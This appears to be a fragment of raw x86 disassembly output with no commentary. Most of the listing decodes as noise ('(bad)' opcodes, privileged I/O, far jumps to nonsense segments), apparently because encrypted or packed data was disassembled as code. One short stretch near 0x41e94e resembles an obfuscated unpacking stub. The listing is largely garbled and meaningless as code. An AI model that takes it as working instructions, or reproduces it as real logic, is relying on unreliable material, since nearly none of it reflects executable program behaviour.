  41e35a:	loopne 0x41e37c
  41e35c:	fimul  DWORD PTR [esi+0x30]
  41e35f:	push   0x21913b17
  41e364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e365:	add    al,0xa8
  41e367:	les    ebx,FWORD PTR [ecx+0x15]
  41e36a:	bnd ret 0x150a
  41e36e:	mov    dl,0x8b
  41e370:	jbe    0x41e2f8
  41e372:	xchg   esi,eax
  41e373:	pop    eax
  41e374:	ret    
  41e375:	dec    edi
  41e376:	lock icebp 
  41e378:	out    dx,al
  41e379:	mov    cl,al
  41e37b:	xor    cl,BYTE PTR [esi-0x65]
  41e37e:	daa    
  41e37f:	sbb    BYTE PTR [edx-0x35],al
  41e382:	xchg   esi,eax
  41e383:	(bad)  
  41e384:	xor    eax,0xa52c3632
  41e389:	mov    dh,BYTE PTR [ebx-0x7962d84f]
  41e38f:	push   ds
  41e390:	in     eax,dx
  41e391:	dec    edi
  41e392:	jns    0x41e3fa
  41e394:	jg     0x41e368
  41e396:	adc    BYTE PTR [ebp+0x1845948a],0x5c
  41e39d:	xor    ch,BYTE PTR [ebp+ebx*2+0x5497f4e9]
  41e3a4:	retf   0x1e86
  41e3a7:	repnz adc edi,edx
  41e3aa:	dec    esp
  41e3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3ac:	pop    esp
  41e3ad:	mov    eax,ds:0x54dfae9e
  41e3b2:	dec    ecx
  41e3b3:	repz or ebx,DWORD PTR [ebp-0x24]
  41e3b7:	mov    ch,0x5a
  41e3b9:	pop    ebp
  41e3ba:	cli    
  41e3bb:	lea    edi,[eax+edi*2]
  41e3be:	mov    ecx,0xacccb0c
  41e3c3:	mov    bl,0xdf
  41e3c5:	imul   edi,DWORD PTR [eax-0x3],0xb7f07af
  41e3cc:	pop    esp
  41e3cd:	and    BYTE PTR [edi+esi*8+0x71],bh
  41e3d1:	(bad)  
  41e3d2:	push   ebx
  41e3d3:	shl    esi,cl
  41e3d5:	mov    BYTE PTR [ebx+0x1e53bcd5],cl
  41e3db:	test   dl,bl
  41e3dd:	icebp  
  41e3de:	push   cs
  41e3df:	je     0x41e37d
  41e3e1:	cmp    al,0xa8
  41e3e3:	adc    bl,BYTE PTR [edi-0xd]
  41e3e6:	out    0xc9,al
  41e3e8:	push   ebp
  41e3e9:	sbb    eax,0x2f85d38
  41e3ee:	jno    0x41e459
  41e3f0:	xchg   BYTE PTR [edi],dh
  41e3f2:	dec    BYTE PTR [ebx-0x66]
  41e3f5:	stc    
  41e3f6:	cmc    
  41e3f7:	push   ebx
  41e3f8:	sbb    eax,0xfcf98d47
  41e3fd:	aad    0x29
  41e3ff:	sbb    bh,cl
  41e401:	or     cl,BYTE PTR [ebp-0x1e5593ee]
  41e407:	sub    DWORD PTR [edi],esi
  41e409:	ret    0xe4d
  41e40c:	and    BYTE PTR [ebp+0x4acaf2b2],0x30
  41e413:	mov    edx,0xf423626
  41e418:	loop   0x41e419
  41e41a:	mov    al,ds:0x6721f0ee
  41e41f:	and    DWORD PTR [eiz*4+0x44eff134],ebp
  41e426:	push   ebp
  41e427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e428:	mov    WORD PTR [esi],gs
  41e42a:	mov    dl,bl
  41e42c:	ret    0x877a
  41e42f:	es rcr ch,cl
  41e432:	xchg   esi,eax
  41e433:	and    dl,al
  41e435:	les    ecx,FWORD PTR [edx]
  41e437:	mov    edx,0x70b82013
  41e43c:	outs   dx,DWORD PTR ds:[esi]
  41e43d:	and    dl,bh
  41e43f:	ins    DWORD PTR es:[edi],dx
  41e440:	inc    ebx
  41e441:	jne    0x41e47f
  41e443:	ret    
  41e444:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41e446:	(bad)  [ebx]
  41e448:	or     DWORD PTR [edi-0x596e35d7],0x7d4bd70d
  41e452:	sub    ch,BYTE PTR [edi+edx*4-0x52ae7d22]
  41e459:	cld    
  41e45a:	cmp    bh,BYTE PTR [edx-0x1c]
  41e45d:	add    ecx,DWORD PTR [edx+eiz*2]
  41e460:	xlat   BYTE PTR ds:[ebx]
  41e461:	repnz fwait
  41e463:	popa   
  41e464:	das    
  41e465:	adc    dl,BYTE PTR [ebx]
  41e467:	(bad)  
  41e468:	mov    esp,0xa1dfb563
  41e46d:	push   ebp
  41e46e:	dec    ebx
  41e46f:	aam    0xa0
  41e471:	gs mov ah,0x7a
  41e474:	mov    ds:0xcaaf74c0,eax
  41e479:	dec    edx
  41e47a:	sub    DWORD PTR [esi+0x6d58e2b9],esi
  41e480:	mov    edx,esp
  41e482:	ret    0xdd65
  41e485:	and    ch,al
  41e487:	dec    edi
  41e488:	pusha  
  41e489:	xchg   edi,eax
  41e48a:	lock inc edi
  41e48c:	inc    ecx
  41e48d:	push   cs
  41e48e:	in     al,0xb7
  41e490:	inc    eax
  41e491:	sbb    dh,bh
  41e493:	jno    0x41e42c
  41e495:	fs fwait
  41e497:	imul   ebx,DWORD PTR [edi-0x580c1c41],0x56
  41e49e:	(bad)  
  41e49f:	out    dx,al
  41e4a0:	aad    0x83
  41e4a2:	lds    edx,FWORD PTR [esi-0x1d]
  41e4a5:	adc    eax,0xac20d74
  41e4aa:	inc    edx
  41e4ab:	pop    esi
  41e4ac:	mov    esi,0x61ad4b41
  41e4b1:	mov    bh,0xf5
  41e4b3:	jg     0x41e526
  41e4b5:	sub    ebx,esp
  41e4b7:	mov    cl,0x42
  41e4b9:	scas   eax,DWORD PTR es:[edi]
  41e4ba:	shr    DWORD PTR [edx+0x64720ec6],1
  41e4c0:	ins    BYTE PTR es:[edi],dx
  41e4c1:	pop    esp
  41e4c2:	fnsave [edi+ebp*1]
  41e4c5:	shl    BYTE PTR [eax+ebp*8],cl
  41e4c8:	outs   dx,BYTE PTR ds:[esi]
  41e4c9:	in     al,dx
  41e4ca:	rcl    BYTE PTR fs:[ecx+eax*1-0x5a126b84],1
  41e4d2:	dec    ebp
  41e4d3:	aam    0x52
  41e4d5:	in     al,dx
  41e4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4d7:	inc    esp
  41e4d8:	fstp   QWORD PTR [ecx]
  41e4da:	xor    al,0x28
  41e4dc:	(bad)  
  41e4dd:	dec    edx
  41e4de:	jl     0x41e540
  41e4e0:	and    BYTE PTR [ebp+0x28],ah
  41e4e3:	push   esp
  41e4e4:	scas   eax,DWORD PTR es:[edi]
  41e4e5:	pusha  
  41e4e6:	mov    WORD PTR [esi+0x8b54459],cs
  41e4ec:	cmc    
  41e4ed:	jl     0x41e4cb
  41e4ef:	popa   
  41e4f0:	(bad)  
  41e4f1:	xor    BYTE PTR [eax-0x65],ch
  41e4f4:	cmp    ch,BYTE PTR [edi-0x1f]
  41e4f7:	aaa    
  41e4f8:	jo     0x41e4a2
  41e4fa:	mov    ebx,0x2e613041
  41e4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e500:	mov    ds:0x526a656a,eax
  41e505:	or     esi,ebx
  41e507:	ins    DWORD PTR es:[edi],dx
  41e508:	cmp    bh,BYTE PTR fs:[edi-0x2df3d75a]
  41e50f:	loope  0x41e4ee
  41e511:	push   es
  41e512:	adc    BYTE PTR [esi+edi*4+0x36],bl
  41e516:	arpl   WORD PTR [eax-0x16d7f97],bx
  41e51c:	sub    esp,DWORD PTR [edx+0x12]
  41e51f:	push   edi
  41e520:	lods   eax,DWORD PTR ds:[esi]
  41e521:	mov    dl,0xbd
  41e523:	pop    es
  41e524:	pause  
  41e526:	mov    ds:0x3130f638,eax
  41e52b:	cmc    
  41e52c:	cs je  0x41e4d1
  41e52f:	fist   WORD PTR [ecx-0x1f]
  41e532:	mov    ebp,0xa490e8e4
  41e537:	ds leave 
  41e539:	push   eax
  41e53a:	icebp  
  41e53b:	inc    ebp
  41e53c:	xchg   DWORD PTR [eax+0xa6b10e9],ecx
  41e542:	jbe    0x41e50b
  41e544:	add    eax,0x6ea8f30e
  41e549:	dec    ecx
  41e54a:	xor    ebx,esp
  41e54c:	push   0xed222888
  41e551:	jle    0x41e56d
  41e553:	fdiv   st(3),st
  41e555:	pop    edx
  41e556:	aas    
  41e557:	in     al,0x47
  41e559:	adc    edi,ecx
  41e55b:	jno    0x41e536
  41e55d:	push   0xffffff90
  41e55f:	push   eax
  41e560:	push   esi
  41e561:	lods   al,BYTE PTR ds:[esi]
  41e562:	stc    
  41e563:	imul   DWORD PTR [ecx+0x79]
  41e566:	mov    ebp,0x1cd21b68
  41e56b:	lea    edi,[edx+0x642b4b29]
  41e571:	xor    ebx,esi
  41e573:	fldcw  WORD PTR [edi+0x42]
  41e576:	mov    al,0x81
  41e578:	nop
  41e579:	cmp    al,0x1d
  41e57b:	pop    ecx
  41e57c:	fwait
  41e57d:	sub    al,0x4e
  41e57f:	jg     0x41e57f
  41e581:	and    BYTE PTR ds:0x5fb33b57,bl
  41e587:	call   0x42a2:0xb1ba3d58
  41e58e:	mov    eax,0xa25df759
  41e593:	sub    BYTE PTR [ebx+0x29],bh
  41e596:	push   ss
  41e597:	xlat   BYTE PTR ds:[ebx]
  41e598:	mov    dl,0xde
  41e59a:	shl    BYTE PTR [ebp+0x37],0x65
  41e59e:	mov    ah,0x73
  41e5a0:	dec    esp
  41e5a1:	mov    ebp,0xbc9efa40
  41e5a6:	or     eax,0xdf96ee47
  41e5ab:	(bad)  
  41e5ac:	fwait
  41e5ad:	loope  0x41e626
  41e5af:	das    
  41e5b0:	xor    al,0xea
  41e5b2:	loop   0x41e551
  41e5b4:	sub    BYTE PTR [ebx-0x4f],ah
  41e5b7:	xor    DWORD PTR [edx+0x1e],ebp
  41e5ba:	outs   dx,DWORD PTR ds:[esi]
  41e5bb:	and    DWORD PTR [esi+0x62],ebp
  41e5be:	or     DWORD PTR ds:0x752135b0,ebx
  41e5c4:	xchg   esi,eax
  41e5c5:	std    
  41e5c6:	push   0x8778fb
  41e5cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5cc:	dec    ebx
  41e5cd:	mov    eax,0x6f2ee6c1
  41e5d2:	jb     0x41e60c
  41e5d4:	cmp    al,0x2c
  41e5d6:	mov    cs,WORD PTR [edi-0x59]
  41e5d9:	push   esi
  41e5da:	push   cs
  41e5db:	jmp    0xacba:0x7bd001e7
  41e5e2:	es jle 0x41e56e
  41e5e5:	cmc    
  41e5e6:	sub    esp,DWORD PTR [ecx+0x733c9de6]
  41e5ec:	push   0x5595924d
  41e5f1:	mov    ch,0xd7
  41e5f3:	test   BYTE PTR [esi+ebp*1+0x74],cl
  41e5f7:	push   0xcb75a8fd
  41e5fc:	push   es
  41e5fd:	cmp    ebp,DWORD PTR [ecx+edi*1+0x522ff203]
  41e604:	aam    0x73
  41e606:	add    al,0xbc
  41e608:	mov    bh,0x78
  41e60a:	dec    ebx
  41e60b:	jmp    FWORD PTR [edi-0x1c804232]
  41e611:	lds    esp,FWORD PTR [ebx-0x10]
  41e614:	pop    ecx
  41e615:	jmp    0x41e65c
  41e617:	(bad)  
  41e618:	enter  0x6437,0xd4
  41e61c:	adc    al,ah
  41e61e:	mov    al,ds:0xa1f9626a
  41e623:	mov    ds:0x67e8346e,al
  41e628:	cmp    dl,BYTE PTR [eax]
  41e62a:	lock iret 
  41e62c:	aad    0xaa
  41e62e:	mov    esi,edx
  41e630:	xor    DWORD PTR [eax-0x4a],esi
  41e633:	inc    ecx
  41e634:	pushf  
  41e635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e636:	mov    dh,0xa8
  41e638:	xchg   esp,eax
  41e639:	std    
  41e63a:	aad    0x82
  41e63c:	xor    BYTE PTR [eax],ah
  41e63e:	out    dx,eax
  41e63f:	xor    BYTE PTR [ecx-0x649f4615],dh
  41e645:	xchg   dl,dh
  41e647:	daa    
  41e648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e649:	and    ecx,DWORD PTR [ecx-0x6f0c3958]
  41e64f:	add    DWORD PTR [ecx],esi
  41e651:	ins    BYTE PTR es:[edi],dx
  41e652:	retf   0xdbd3
  41e655:	test   ah,0x38
  41e658:	ja     0x41e68f
  41e65a:	jne    0x41e6a6
  41e65c:	mov    bh,0x26
  41e65e:	std    
  41e65f:	outs   dx,BYTE PTR ds:[esi]
  41e660:	fadd   QWORD PTR [ebx-0x21]
  41e663:	xchg   esi,eax
  41e664:	pop    ds
  41e665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e666:	and    esp,ebx
  41e668:	loop   0x41e66c
  41e66a:	call   0x365f5081
  41e66f:	jecxz  0x41e607
  41e671:	sub    bh,ah
  41e673:	xchg   ebx,eax
  41e674:	inc    ebx
  41e675:	inc    ebx
  41e676:	out    dx,al
  41e677:	sar    DWORD PTR [edx+0x11],1
  41e67a:	retf   0x744c
  41e67d:	lds    edx,FWORD PTR [ecx-0x19]
  41e680:	arpl   WORD PTR [edx+edx*8],bx
  41e683:	div    ebp
  41e685:	add    DWORD PTR [ebx],esi
  41e687:	lods   al,BYTE PTR ds:[esi]
  41e688:	fwait
  41e689:	inc    esi
  41e68a:	dec    ecx
  41e68b:	pushf  
  41e68c:	jns    0x41e6fe
  41e68e:	bound  edi,QWORD PTR [edx+0x15]
  41e691:	xor    BYTE PTR [edx+ecx*1-0x16],0x26
  41e696:	cmp    eax,0x4a8f63e5
  41e69b:	sbb    eax,0x81232452
  41e6a0:	and    al,0xfd
  41e6a2:	fisttp WORD PTR [edx]
  41e6a4:	stc    
  41e6a5:	lds    ebp,FWORD PTR [ecx+0x6b]
  41e6a8:	jo     0x41e6de
  41e6aa:	pop    esp
  41e6ab:	pop    es
  41e6ac:	push   edx
  41e6ad:	and    eax,0x8c04be0e
  41e6b2:	mov    ah,BYTE PTR [ecx]
  41e6b4:	mov    DWORD PTR [edi+0x7a],0x9fbdc651
  41e6bb:	or     edx,edi
  41e6bd:	mov    ah,0xcc
  41e6bf:	shl    DWORD PTR [ebp+0x49],cl
  41e6c2:	adc    BYTE PTR [eax-0x48],al
  41e6c5:	aam    0x81
  41e6c7:	pusha  
  41e6c8:	cld    
  41e6c9:	inc    esp
  41e6ca:	sub    BYTE PTR [esi+0x3f],ah
  41e6cd:	out    dx,eax
  41e6ce:	loopne 0x41e743
  41e6d0:	cmp    BYTE PTR [edx],dh
  41e6d2:	xchg   edx,eax
  41e6d3:	or     DWORD PTR [esp+ebx*1+0x44],ebp
  41e6d7:	jno    0x41e6e0
  41e6d9:	frstor [ecx+0x5]
  41e6dc:	mov    esi,0xf2f6e1e0
  41e6e1:	aad    0x93
  41e6e3:	mov    ds:0x9c4bcd11,al
  41e6e8:	xlat   BYTE PTR ds:[ebx]
  41e6e9:	pop    DWORD PTR [esi-0x2d06490a]
  41e6ef:	push   ebp
  41e6f0:	dec    ecx
  41e6f1:	popa   
  41e6f2:	ffreep st(6)
  41e6f4:	mov    gs,eax
  41e6f6:	aam    0x5f
  41e6f8:	test   eax,0x2500f25d
  41e6fd:	ins    DWORD PTR es:[edi],dx
  41e6fe:	or     edx,esi
  41e700:	bound  ebp,QWORD PTR [ecx]
  41e702:	jbe    0x41e6e6
  41e704:	xor    eax,0xd9743898
  41e709:	xor    bh,0xef
  41e70c:	daa    
  41e70d:	xchg   ecx,eax
  41e70e:	ret    0x5f4e
  41e711:	sub    ebx,ecx
  41e713:	mov    cl,0xfc
  41e715:	and    al,0x91
  41e717:	jle    0x41e752
  41e719:	dec    ecx
  41e71a:	sbb    al,0xe0
  41e71c:	adc    BYTE PTR [ebp-0x290ba0ef],dh
  41e722:	call   0x74a0:0x862fddb5
  41e729:	into   
  41e72a:	sub    eax,0x805ff53e
  41e72f:	mov    edx,0xea1d647e
  41e734:	lea    ebp,gs:[eax-0x38]
  41e738:	scas   al,BYTE PTR es:[edi]
  41e739:	dec    esp
  41e73a:	jo     0x41e6fa
  41e73c:	lock cmp esp,DWORD PTR [ecx-0x2f]
  41e740:	popf   
  41e741:	jnp    0x41e794
  41e743:	cmp    eax,0x6e8d9394
  41e748:	mov    esp,0x497c1867
  41e74d:	dec    edi
  41e74e:	jb     0x41e6f3
  41e750:	fmul   st(0),st
  41e752:	sbb    DWORD PTR [edi-0x8],ebx
  41e755:	ret    0x306e
  41e758:	retf   0xb28c
  41e75b:	xchg   esp,eax
  41e75c:	and    edx,ebx
  41e75e:	shl    BYTE PTR [ecx+0x70c301bb],cl
  41e764:	lods   eax,DWORD PTR ds:[esi]
  41e765:	repnz (bad) [edi+0x4acb9815]
  41e76c:	jle    0x41e712
  41e76e:	not    DWORD PTR [edi+0x4b]
  41e771:	mov    ds:0xd694500a,eax
  41e776:	(bad)  
  41e778:	xchg   esp,eax
  41e779:	aad    0x30
  41e77b:	lahf   
  41e77c:	lock cld 
  41e77e:	in     eax,0xa0
  41e780:	jb     0x41e71c
  41e782:	or     BYTE PTR [eax-0x5f],ah
  41e785:	mov    edx,0xfa11af50
  41e78a:	(bad)  
  41e78b:	and    DWORD PTR [edi],ebp
  41e78d:	push   ds
  41e78e:	mov    dl,0xb6
  41e790:	xchg   esp,eax
  41e791:	cmp    DWORD PTR [eax+esi*2+0x7a],ebp
  41e795:	adc    dl,BYTE PTR [eax-0x936370a]
  41e79b:	ja     0x41e72f
  41e79d:	scas   al,BYTE PTR es:[edi]
  41e79e:	in     eax,0x27
  41e7a0:	inc    esp
  41e7a1:	push   ds
  41e7a2:	lock add BYTE PTR [edi-0x6d],dl
  41e7a6:	repnz iret 
  41e7a8:	push   ss
  41e7a9:	jecxz  0x41e752
  41e7ab:	nop
  41e7ac:	adc    edi,esi
  41e7ae:	aam    0x7e
  41e7b0:	aam    0x3
  41e7b2:	cs inc ecx
  41e7b4:	push   edi
  41e7b5:	jns    0x41e800
  41e7b7:	or     ecx,0xb
  41e7ba:	outs   dx,BYTE PTR ds:[esi]
  41e7bb:	inc    edx
  41e7bc:	lahf   
  41e7bd:	lahf   
  41e7be:	add    esp,DWORD PTR [ecx+0x59c6c3a5]
  41e7c4:	ret    
  41e7c5:	(bad)  
  41e7c6:	mov    edx,0xdbce41d1
  41e7cb:	dec    edx
  41e7cc:	cmp    DWORD PTR [eax],edx
  41e7ce:	mov    DWORD PTR [eax+0x721b8ed3],edi
  41e7d4:	dec    esp
  41e7d5:	in     al,0x44
  41e7d7:	push   0x76
  41e7d9:	jl     0x41e82b
  41e7db:	mov    edx,0xf2aaa4c4
  41e7e0:	mov    ah,0xb
  41e7e2:	loopne 0x41e7bc
  41e7e4:	and    BYTE PTR [eax-0x38],ah
  41e7e7:	inc    ecx
  41e7e8:	inc    ebx
  41e7e9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7eb:	ret    0x59fd
  41e7ee:	outs   dx,DWORD PTR ds:[esi]
  41e7ef:	sub    edi,ebx
  41e7f1:	pop    ebx
  41e7f2:	leave  
  41e7f3:	pop    ecx
  41e7f4:	dec    edx
  41e7f5:	push   cs
  41e7f6:	mov    edi,0x60ce4505
  41e7fb:	push   ds
  41e7fc:	aad    0x46
  41e7fe:	sti    
  41e7ff:	sbb    ebp,DWORD PTR [edx+0x65]
  41e802:	jns    0x41e7c5
  41e804:	cmp    BYTE PTR [edx+0x22],ah
  41e807:	pushf  
  41e808:	je     0x41e7dd
  41e80a:	cmp    edx,DWORD PTR [ebp+0x35]
  41e80d:	outs   dx,DWORD PTR ds:[esi]
  41e80e:	xchg   DWORD PTR [edx-0x7758eff0],edi
  41e814:	push   edx
  41e815:	add    al,0x50
  41e817:	inc    eax
  41e818:	loop   0x41e846
  41e81a:	in     eax,0xcc
  41e81c:	cmc    
  41e81d:	pop    ebx
  41e81e:	ds aaa 
  41e820:	mov    esp,0x75195d47
  41e825:	inc    ebx
  41e826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e827:	sbb    edi,esi
  41e829:	sar    esi,cl
  41e82b:	in     al,0xca
  41e82d:	js     0x41e876
  41e82f:	cli    
  41e830:	and    dl,0xfc
  41e833:	adc    DWORD PTR [edi+ebp*2],edi
  41e836:	leave  
  41e837:	out    dx,eax
  41e838:	stc    
  41e839:	cmp    dl,ah
  41e83b:	and    eax,0x234fa697
  41e840:	jns    0x41e821
  41e842:	jo     0x41e866
  41e844:	mov    edx,0x59a0a128
  41e849:	push   ss
  41e84a:	sbb    ah,bh
  41e84c:	jmp    0x41e8ac
  41e84e:	in     al,0x43
  41e850:	xchg   esp,eax
  41e851:	rol    DWORD PTR [ebp+ebp*8-0x24],0xb9
  41e856:	jb     0x41e878
  41e858:	push   ds
  41e859:	push   0xa01cc832
  41e85e:	mov    eax,ds:0xe126808a
  41e863:	in     al,dx
  41e864:	in     al,0x4a
  41e866:	ffreep st(1)
  41e868:	jmp    0x3fc86e94
  41e86d:	out    dx,al
  41e86e:	and    dl,BYTE PTR [esi+0x56]
  41e871:	dec    eax
  41e872:	test   al,0xf5
  41e874:	fdiv   QWORD PTR [esi+0x537fd9c]
  41e87a:	in     eax,0xf2
  41e87c:	sti    
  41e87d:	neg    BYTE PTR [edx+0x6cc007fb]
  41e883:	jno    0x41e8b6
  41e885:	repnz iret 
  41e887:	jecxz  0x41e8cb
  41e889:	jne    0x41e874
  41e88b:	sar    ah,0x51
  41e88e:	cld    
  41e88f:	dec    ebp
  41e890:	int    0x14
  41e892:	xchg   BYTE PTR [esi],ch
  41e894:	push   es
  41e895:	push   eax
  41e896:	fst    st(7)
  41e898:	jns    0x41e825
  41e89a:	pop    esi
  41e89b:	(bad)  
  41e89c:	pop    ebx
  41e89d:	test   BYTE PTR [edx+esi*1-0x12b4517b],bh
  41e8a4:	xchg   edi,eax
  41e8a5:	adc    edi,esp
  41e8a7:	jmp    0xa539429e
  41e8ac:	xchg   esi,eax
  41e8ad:	icebp  
  41e8ae:	rcr    BYTE PTR [edi+ebp*4+0x4f],1
  41e8b2:	inc    eax
  41e8b3:	cmp    DWORD PTR [esi-0xe5aed04],esi
  41e8b9:	leave  
  41e8ba:	sub    eax,0x15f2b322
  41e8bf:	mov    ebp,0x6dffa3f6
  41e8c4:	inc    ebp
  41e8c5:	xchg   edi,eax
  41e8c6:	cwde   
  41e8c7:	cmp    eax,0xfbca922e
  41e8cc:	pusha  
  41e8cd:	mov    edx,0xcd8fc4ff
  41e8d2:	mov    esi,DWORD PTR [esi+0x685e73ba]
  41e8d8:	cmp    dl,BYTE PTR [edi+ebp*1-0x32]
  41e8dc:	dec    edx
  41e8dd:	ins    DWORD PTR es:[edi],dx
  41e8de:	retf   0xbb6f
  41e8e1:	mov    dh,0x91
  41e8e3:	jbe    0x41e8a1
  41e8e5:	ror    DWORD PTR [edx+0x1],cl
  41e8e8:	jp     0x41e8ab
  41e8ea:	mov    eax,ds:0x66fe8cf7
  41e8ef:	pop    eax
  41e8f0:	jg     0x41e891
  41e8f2:	imul   ebx,DWORD PTR [ebp+ebp*1-0x18ab11d5],0x9382d6ea
  41e8fd:	js     0x41e8e3
  41e8ff:	xchg   edx,eax
  41e900:	mov    dh,0x0
  41e902:	dec    ebx
  41e903:	mov    ch,0x3b
  41e905:	mov    edx,DWORD PTR [edi+0x54]
  41e908:	call   DWORD PTR [eax]
  41e90a:	push   cs
  41e90b:	adc    DWORD PTR gs:[edx+edi*8],edx
  41e90f:	cld    
  41e910:	in     al,dx
  41e911:	mov    ebp,0xe55371ad
  41e916:	or     dh,BYTE PTR [ebx+0x67]
  41e919:	jmp    0x41e97f
  41e91b:	imul   esp,ebp,0xffffff8b
  41e91e:	push   eax
  41e91f:	popa   
  41e920:	jbe    0x41e8b6
  41e922:	gs nop
  41e924:	sahf   
  41e925:	mov    bl,0xc8
  41e927:	retf   0xa009
  41e92a:	inc    eax
  41e92b:	gs mov dh,cl
  41e92e:	cdq    
  41e92f:	sub    BYTE PTR [ecx],dh
  41e931:	fldcw  WORD PTR [ebx+edi*2-0x13]
  41e935:	jmp    FWORD PTR [ebx+0x54]
  41e938:	out    0xf6,eax
  41e93a:	aam    0x13
  41e93c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e93e:	mov    ebx,ecx
  41e940:	mov    ecx,0x7783b69a
  41e945:	or     eax,0xadce411c
  41e94a:	shl    DWORD PTR [eax+0x33],0xd0
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs es fxch st(4)
  41e99b:	mov    WORD PTR [ebx],es
  41e99d:	test   BYTE PTR [esi+0xa7a7dc2],cl
  41e9a3:	pop    edi
  41e9a4:	jp     0x41ea20
  41e9a6:	call   0x2e5f:0x361e3a76
  41e9ad:	mov    WORD PTR [ecx+0xe58269f],ds
  41e9b3:	shr    DWORD PTR [eax-0x45],1
  41e9b6:	jo     0x41e9c1
  41e9b8:	fiadd  WORD PTR [edi-0x8]
  41e9bb:	scas   al,BYTE PTR es:[edi]
  41e9bc:	add    DWORD PTR [edi-0x6efe09d2],edx
  41e9c2:	repnz mov ebp,0xc782149c
  41e9c8:	in     eax,0x29
  41e9ca:	aaa    
  41e9cb:	mov    ecx,0xd2016bf9
  41e9d0:	(bad)  
  41e9d2:	mov    ds:0x50865d2d,al
  41e9d7:	(bad)  
  41e9d8:	sub    dh,BYTE PTR [ecx-0x1a]
  41e9db:	scas   eax,DWORD PTR es:[edi]
  41e9dc:	fadd   DWORD PTR [edx]
  41e9de:	fst    QWORD PTR [edi]
  41e9e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9e1:	add    ah,BYTE PTR [esp+ebp*8+0x46]
  41e9e5:	mov    ecx,0x6e8e94e1
  41e9ea:	push   0xa5524934
  41e9ef:	jne    0x41ea01
  41e9f1:	jns    0x41e9fb
  41e9f3:	je     0x41ea48
  41e9f5:	sub    ecx,ebp
  41e9f7:	cs jo  0x41e9c6
  41e9fa:	sbb    ah,ah
  41e9fc:	ins    DWORD PTR es:[edi],dx
  41e9fd:	into   
  41e9fe:	mov    eax,0xf03e1377
  41ea03:	xor    dl,BYTE PTR [ebp-0x56]
  41ea06:	pop    ss
  41ea07:	ror    ebx,1
  41ea09:	out    dx,al
  41ea0a:	lods   eax,DWORD PTR ds:[esi]
  41ea0b:	test   BYTE PTR ds:0x57424b4c,0xcf
  41ea12:	lods   eax,DWORD PTR ds:[esi]
  41ea13:	mov    al,0x82
  41ea15:	aaa    
  41ea16:	sub    al,0xc3
  41ea18:	mov    al,0xae
  41ea1a:	adc    eax,0xa02c90ad
  41ea1f:	fild   QWORD PTR [ebx-0x10]
  41ea22:	adc    edi,DWORD PTR [ebp+0x55]
  41ea25:	sbb    bl,ch
  41ea27:	dec    esi
  41ea28:	call   0x9aff:0x8e963ddf
  41ea2f:	push   esi
  41ea30:	cmp    DWORD PTR ds:0xf9ec09d6,edx
  41ea36:	je     0x41ea8e
  41ea38:	test   DWORD PTR [esi-0x71],0x853d4483
  41ea3f:	mov    ds:0x9007c124,eax
  41ea44:	xor    al,0xf7
  41ea46:	fstp   DWORD PTR [edx-0x24fd4198]
  41ea4c:	inc    esp
  41ea4d:	or     BYTE PTR [esi],dh
  41ea4f:	lahf   
  41ea50:	xchg   edi,eax
  41ea51:	or     bl,dl
  41ea53:	(bad)  
  41ea54:	push   ebx
  41ea55:	ins    BYTE PTR es:[edi],dx
  41ea56:	push   0x8b9a47b7
  41ea5b:	test   DWORD PTR [esi+0x4f],0xaacbaf46
  41ea62:	mov    ch,0x7c
  41ea64:	ins    BYTE PTR es:[edi],dx
  41ea65:	aam    0xab
  41ea67:	inc    edi
  41ea68:	jno    0x41eac2
  41ea6a:	test   bl,cl
  41ea6c:	push   eax
  41ea6d:	dec    ebp
  41ea6e:	mov    fs,WORD PTR [eax-0x51]
  41ea71:	cmp    bh,bl
  41ea73:	hlt    
  41ea74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea75:	arpl   WORD PTR [ebp-0x3a],si
  41ea78:	mov    esp,DWORD PTR [esi]
  41ea7a:	outs   dx,BYTE PTR ds:[esi]
  41ea7b:	mov    edi,0x8244822b
  41ea80:	gs mov al,0xf1
  41ea83:	push   0xc79993fc
  41ea88:	xor    eax,0xdbb5cf16
  41ea8d:	push   esp
  41ea8e:	sub    al,0x33
  41ea90:	scas   al,BYTE PTR es:[edi]
  41ea91:	out    0x11,eax
  41ea93:	jmp    0xdebd:0xe8cc625f
  41ea9a:	mov    ch,dl
  41ea9c:	jno    0x41ea72
  41ea9e:	outs   dx,DWORD PTR ds:[esi]
  41ea9f:	mov    al,0xb7
  41eaa1:	mov    esp,DWORD PTR [eax+0x7d4f89c]
  41eaa7:	out    dx,al
  41eaa8:	dec    esp
  41eaa9:	rol    DWORD PTR [esp+ebp*1],1
  41eaac:	add    al,0x57
  41eaae:	iret   
  41eaaf:	(bad)  
  41eab0:	xchg   edx,eax
